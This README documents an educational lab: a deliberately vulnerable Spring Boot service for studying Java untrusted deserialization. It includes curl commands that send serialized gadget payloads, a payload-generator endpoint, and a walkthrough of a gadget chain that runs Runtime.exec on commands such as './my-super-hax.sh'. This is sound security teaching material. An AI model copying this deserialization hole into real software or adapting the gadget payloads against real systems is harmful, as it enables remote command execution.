# Untrusted Deserialization Lab
> Use untrusted deserialization to execute commands on a host device
> 
> Implementation of Untrusted Deserialization example in "Understanding and Identifying Vulnerabilities Related to Architectural Security Tactics"
> 
> Da Silva Santos, Joanna Cecilia. Understanding and Identifying Vulnerabilities \
> &emsp; Related to Architectural Security Tactics. 2021. Rochester Institute of \
> &emsp; Technology, PhD dissertation. https://repository.rit.edu/. \
> &emsp; repository.rit.edu/theses/10967/.
> 
> See [Walkthrough](#walkthrough) for a detailed walk through of the attack


## Quickstart
```bash
docker build -t ud-demo:1.0.0 .
docker run --rm -it -d -p 8080:8080 --name ud-demo ud-demo:1.0.0  # -d runs container in detached mode
```
This will launch the SpringBoot API. Attacks can be attempted at http://localhost:8080/hello.

To stop the container, run `docker stop ud-demo`

This api takes in a user cookie with a Base64 serialized [User](src/main/java/com/exploitlab/untrusteddeserialization/model/User.java) object and generates a random greeting.

### Examples
**Intended usage**

cookie user = Base64 encoded [User](src/main/java/com/exploitlab/untrusteddeserialization/model/User.java) Object with the name 'Bob'
```bash
curl --request GET \
  --url http://localhost:8080/hello \
  --cookie user=rO0ABXNyADJjb20uZXhwbG9pdGxhYi51bnRydXN0ZWRkZXNlcmlhbGl6YXRpb24ubW9kZWwuVXNlch0Ic9HT0581AgABTAAEbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAADQm9i
```

Response
```html
<html><head><title>Hello World!</title></head>
<body><h1>Hola, Bob!</h1></body></html>
```
Random greeting of user

---
**Example Untrusted Deserialization**

cookie user = Base64 encoded [CacheManager](src/main/java/com/exploitlab/untrusteddeserialization/gadget/CacheManager.java) Object with './my-super-hax.sh' as the command payload
> This will only work when using the container, to add your own payloads see [Custom Payloads](#custom-payloads)

```bash
curl --request GET \
  --url http://localhost:8080/hello \
  --cookie user=rO0ABXNyADtjb20uZXhwbG9pdGxhYi51bnRydXN0ZWRkZXNlcmlhbGl6YXRpb24uZ2FkZ2V0LkNhY2hlTWFuYWdlcl3GhkU3spJAAgABTAAIaW5pdEhvb2t0ABRMamF2YS9sYW5nL1J1bm5hYmxlO3hwc3IAOmNvbS5leHBsb2l0bGFiLnVudHJ1c3RlZGRlc2VyaWFsaXphdGlvbi5nYWRnZXQuQ29tbWFuZFRhc2us4qHWMIDsCAIAAUwAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAES4vbXktc3VwZXItaGF4LnNo
```
Response
```json
{"timestamp":"2024-04-29T13:49:48.663+00:00","status":500,"error":"Internal Server Error","message":"Failed to process User","path":"/hello"}
```
Internal Server error and container will be stopped

## Utility Methods

### Custom Encoding
Two Encoder endpoints are provided to generate Base64 Strings to be used with the `/hello` endpoint

- `/encode?value=<value to encode>`
Encode a given value
```bash
curl http://localhost:8080/encode?value=foobar
# Returns 'Zm9vYmFy'
```
- `/encode-user?name=<name of user>`
Create a new User Object and return the encoded results
```bash
curl http://localhost:8080/encode-user?name=Alice
# Returns 'rO0ABXNyADJjb20uZXhwbG9pdGxhYi51bnRydXN0ZWRkZXNlcmlhbGl6YXRpb24ubW9kZWwuVXNlch0Ic9HT0581AgABTAAEbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAFQWxpY2U='
```

### Custom Payloads
Generate Based64 payloads to send to the `/hello` endpoint

- `/exploit` (Default)
Generate a safe for windows payload that opens notepad
```bash
curl http://localhost:8080/exploit
# Returns 'rO0ABXNyADtjb20uZXhwbG9pdGxhYi51bnRydXN0ZWRkZXNlcmlhbGl6YXRpb24uZ2FkZ2V0LkNhY2hlTWFuYWdlcl3GhkU3spJAAgABTAAIaW5pdEhvb2t0ABRMamF2YS9sYW5nL1J1bm5hYmxlO3hwc3IAOmNvbS5leHBsb2l0bGFiLnVudHJ1c3RlZGRlc2VyaWFsaXphdGlvbi5nYWRnZXQuQ29tbWFuZFRhc2us4qHWMIDsCAIAAUwAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAC25vdGVwYWQuZXhl'
```

- `/exploit` (Custom Payload)
Provide a JSON body with a payload in the form of `{"payload":"<your payload here>"}`
```bash
curl --request GET \
  --url http://localhost:8080/exploit \
  --header 'Content-Type: application/json' \
  --data '{"payload":"./my-super-hax.sh"}'
# Returns 'rO0ABXNyADtjb20uZXhwbG9pdGxhYi51bnRydXN0ZWRkZXNlcmlhbGl6YXRpb24uZ2FkZ2V0LkNhY2hlTWFuYWdlcl3GhkU3spJAAgABTAAIaW5pdEhvb2t0ABRMamF2YS9sYW5nL1J1bm5hYmxlO3hwc3IAOmNvbS5leHBsb2l0bGFiLnVudHJ1c3RlZGRlc2VyaWFsaXphdGlvbi5nYWRnZXQuQ29tbWFuZFRhc2us4qHWMIDsCAIAAUwAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAES4vbXktc3VwZXItaGF4LnNo'
# Same used as in the demo
```

## Local Deployment
⚠️ THIS IS NOT RECOMMENDED AND POTENTIAL DANGEROUS; PROCEED WITH CAUTION ⚠️
It is HIGHLY recommended to attempt attacks inside containers or VMs, especially when testing malicious. Take caution 
when sending payloads locally.

```bash
mvn spring-boot:run
 ```


## Walkthrough
During the deserialization process, certain callback methods known as "magic methods" are used to reconstruct the object
_[HelloServlet.java](src/main/java/com/exploitlab/untrusteddeserialization/controller/HelloServlet.java)_
```java
// Attempt to convert into object
LOGGER.info("Attempting to deserialize into User Object");  //  L75
User u = (User) in.readObject();        // EXPLOIT BEGINS HERE  L76
LOGGER.info("Successfully deserialized into User Object");  //  L77
```

During normal serialization, this is not an issue as the `User`'s default `readObject()` method will be used. However,
when sending the serialized `CacheManager` "Gadget Class"[^1], its `readObject()` method is used instead.

_[CacheManager.java](src/main/java/com/exploitlab/untrusteddeserialization/gadget/CacheManager.java)_
```java
@Serial
private void readObject(ObjectInputStream ois) throws ClassNotFoundException, IOException {     // L35
    ois.defaultReadObject();                                                                    // L36
    this.initHook.run();                                                                        // L37
}                                                                                               // L38
```

The `CacheManager` calls its `initHook` to run during this process which when used as intended may be harmless, 
however in the example we created a `CommandTask` for the `CacheManager` with a "malicious" payload.

```java
// Load objects
CommandTask cmdTask = new CommandTask("notepad.exe");   // L60, replaced with default for this example
CacheManager cm = new CacheManager(cmdTask);            // L61

String encoding = this.encoderService.encodeObject(cm); // L63
```

Now when the `run()` method is called in `CommandTask`
_[CommandTask.java](src/main/java/com/exploitlab/untrusteddeserialization/gadget/CommandTask.java)_
```java
@Override
public void run() {
    try {                                           // L39
        Runtime.getRuntime().exec(this.command);    // L40
    } catch (IOException e) {                       // L41
        throw new RuntimeException(e);              // L42
    }
}
```
it effectively acts the same as running `notepad.exe` on the command line.

[^1]: Gadget Classes are serializable classes that can be chained together to perform the exploit

